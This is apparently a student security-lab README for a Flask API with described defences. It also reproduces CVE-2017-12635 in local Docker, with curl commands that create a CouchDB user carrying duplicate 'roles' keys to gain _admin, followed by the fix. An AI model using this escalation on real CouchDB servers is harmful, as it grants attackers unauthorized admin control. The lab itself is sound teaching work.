# Information Security Lab 1

This repository contains a small Flask API and a practice environment for
**CVE-2017-12635** (CouchDB privilege escalation).

## What is inside

```text
app.py                  Flask API
tests/test_app.py       six simple tests
cve/                    CVE reproduction files and the fixed CouchDB setup
docs/screenshots/       evidence screenshots
.github/workflows/      GitHub Actions
```

## Run the API

Windows PowerShell:

```powershell
py -3 -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install -r requirements-dev.txt
$env:JWT_SECRET = "change-this-to-a-long-random-string"
python app.py
```

The API runs on `http://127.0.0.1:5000`.

Demo users:

| User | Password | Role |
|---|---|---|
| alice | `AlicePass123!` | admin |
| bob | `BobPass123!` | user |

## API

### Login

```bash
curl -s -X POST http://127.0.0.1:5000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"login":"alice","password":"AlicePass123!"}'
```

The response contains an `access_token`.

### Get data

```bash
curl -s http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer <token>"
```

Without a token the server returns `401`. The optional `?q=` parameter searches
posts.

### Create data

```bash
curl -s -X POST http://127.0.0.1:5000/api/data \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"title":"Hello","body":"My first post"}'
```

## Security measures

- **SQL injection:** all queries use `?` placeholders, for example
  `SELECT * FROM users WHERE username = ?`.
- **XSS:** user text is escaped with `html.escape()` before it is returned.
- **Passwords:** stored as bcrypt hashes, never in plaintext.
- **Authentication:** login returns a JWT; protected routes verify the
  `Authorization: Bearer` header with `jwt.decode(..., algorithms=["HS256"])`.
- The API also sets `X-Content-Type-Options: nosniff` and
  `X-Frame-Options: DENY`.

## Tests and CI

```text
python -m pytest -q
......                                                                   [100%]
6 passed

python -m bandit app.py -f txt
No issues identified.

python -m pip_audit -r requirements.txt
No known vulnerabilities found
```

GitHub Actions runs these checks on every push:

<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39197917908>

## CVE-2017-12635

CVE-2017-12635 is a privilege escalation bug in Apache CouchDB before 1.7.0 and
2.x before 2.1.1. CouchDB uses an Erlang JSON parser for authorization and a
JavaScript parser for stored documents. If a user document contains two
`roles` keys, the two parsers can read different values. An attacker can send
`"roles": ["_admin"]` followed by `"roles": []`, pass the admin check, and still
store a user with the `_admin` role.

### Start the vulnerable version

```bash
cd vulhub/couchdb/CVE-2017-12635
docker compose up -d
```

If the init container reports `$'\r': command not found`, the `init.sh` file
has Windows line endings. Convert it to LF or set
`git config --global core.autocrlf false` before cloning Vulhub.

### Reproduce

Normal request with an admin role (rejected):

```bash
curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
  -H "Content-Type: application/json" \
  --data-binary @cve/normal_user.json
```

Expected: `403 Forbidden`, `Only _admin may set roles`.

Request with duplicate `roles` keys:

```bash
curl -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub \
  -H "Content-Type: application/json" \
  --data-binary @cve/duplicate_roles.json
```

Expected: `201 Created`.

Check the new user:

```bash
curl -u vulhub:vulhub http://127.0.0.1:5984/_session
```

The response contains `"roles":["_admin"]`. The user can also create a
database:

```bash
curl -i -u vulhub:vulhub -X PUT http://127.0.0.1:5984/evil_db
```

### Fix

Use CouchDB 2.1.1:

```bash
docker compose -f cve/fixed/docker-compose.yml up -d
```

The fixed instance listens on `http://127.0.0.1:5985`.

The duplicate-role request is still accepted (`201`), but the stored document
has `"roles":[]`. Logging in as `vulhub:vulhub` now gives an empty role list,
and an admin-only request returns `401`.

Normal registration still works:

```bash
curl -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser \
  -H "Content-Type: application/json" \
  --data-binary @cve/plain_user.json

curl -u normaluser:normalpass http://127.0.0.1:5985/_session
```

Expected: `201 Created`, then `"roles":[]`. This is the regression test: the
fix blocks privilege escalation without breaking ordinary user creation.

## Evidence

![Vulnerable CouchDB](docs/screenshots/cve-before.png)

![Fixed CouchDB](docs/screenshots/cve-after.png)

![GitHub Actions](docs/screenshots/ci-success.png)

## Repository

<https://github.com/zhangyu7777777/InformationSecurity_23320309>
